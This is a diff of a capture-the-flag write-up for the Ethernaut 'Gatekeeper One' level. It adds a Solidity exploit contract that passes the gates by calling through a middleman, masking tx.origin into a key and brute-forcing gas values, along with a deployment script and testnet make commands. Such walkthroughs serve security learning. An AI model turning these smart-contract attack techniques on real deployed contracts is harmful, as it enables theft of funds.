@@ -52,14 +52,10 @@ contract GatekeeperOne {
 
 ### Exploit
 
-The
-
-1.
-
 {% tabs %}
 {% tab title="Anvil" %}
 ```bash
-make anvil-exploit-level-1
+make anvil-exploit-level-13
 
 <INPUT_LEVEL_INSTANCE_CONTRACT_ADDRESS>
 ```
@@ -67,7 +63,7 @@ make anvil-exploit-level-1
 
 {% tab title="Holesky" %}
 ```bash
-make holesky-exploit-level-1
+make holesky-exploit-level-13
 
 <INPUT_LEVEL_INSTANCE_CONTRACT_ADDRESS>
 ```
@@ -76,32 +72,80 @@ make holesky-exploit-level-1
 
 {% tabs %}
 {% tab title="Exploit Contract" %}
-LINK
+{% embed url="https://github.com/EridianAlpha/ethernaut-foundry/blob/4dc2126006371c28e6945efa78c79b6a68f96b06/src/Level13.sol" %}
 
-{% code title="src/Level4.sol" %}
+{% code title="src/Level13.sol" %}
 ```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+import {Script, console} from "forge-std/Script.sol";
+
+// ================================================================
+// │                    LEVEL 13 - GATEKEEPER ONE                 │
+// ================================================================
+contract GatekeeperOneMiddleman {
+    function run(address targetContract) public {
+        // Gate one is passed just by calling the enter function from this contract
+        // causing the tx.origin to be different from the msg.sender
+
+        bool succeeded = false;
+
+        // Gate three requires...
+        bytes8 key = bytes8(uint64(uint160(tx.origin)) & 0xffffffff0000ffff);
+
+        uint256 gas = 65782;
+
+        // Gate two requires calculating the gas remaining...
+        for (uint256 i = gas - 5052; i < gas + 5052; i++) {
+            console.log("Trying gas: ", i);
+            (bool success,) = address(targetContract).call{gas: i}(abi.encodeWithSignature("enter(bytes8)", key));
+            if (success) {
+                succeeded = success;
+                break;
+            }
+        }
+    }
+}
 ```
 {% endcode %}
 {% endtab %}
 
 {% tab title="Exploit Deployment Script" %}
-LINK
+{% embed url="https://github.com/EridianAlpha/ethernaut-foundry/blob/4dc2126006371c28e6945efa78c79b6a68f96b06/script/Level13.s.sol" %}
 
-{% code title="script/Level4.s.sol" %}
+{% code title="script/Level13.s.sol" %}
 ```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+import {Script, console} from "forge-std/Script.sol";
+import {HelperFunctions} from "script/HelperFunctions.s.sol";
+
+import {GatekeeperOneMiddleman} from "../src/Level13.sol";
+
+// ================================================================
+// │                    LEVEL 13 - GATEKEEPER ONE                 │
+// ================================================================
+contract Exploit is Script, HelperFunctions {
+    function run() public {
+        address targetContractAddress = getInstanceAddress();
+
+        vm.startBroadcast();
+        GatekeeperOneMiddleman gatekeeperOneMiddleman = new GatekeeperOneMiddleman();
+        gatekeeperOneMiddleman.run(targetContractAddress);
+        vm.stopBroadcast();
+    }
+}
 ```
 {% endcode %}
 {% endtab %}
 {% endtabs %}
 
-2. Submit instance... 🥳
+Submit instance... 🥳
 
 ### Completion Message
 
 {% hint style="info" %}
-
+Well done! Next, try your hand with the second gatekeeper...
 {% endhint %}
-
-### Notes
-
-*
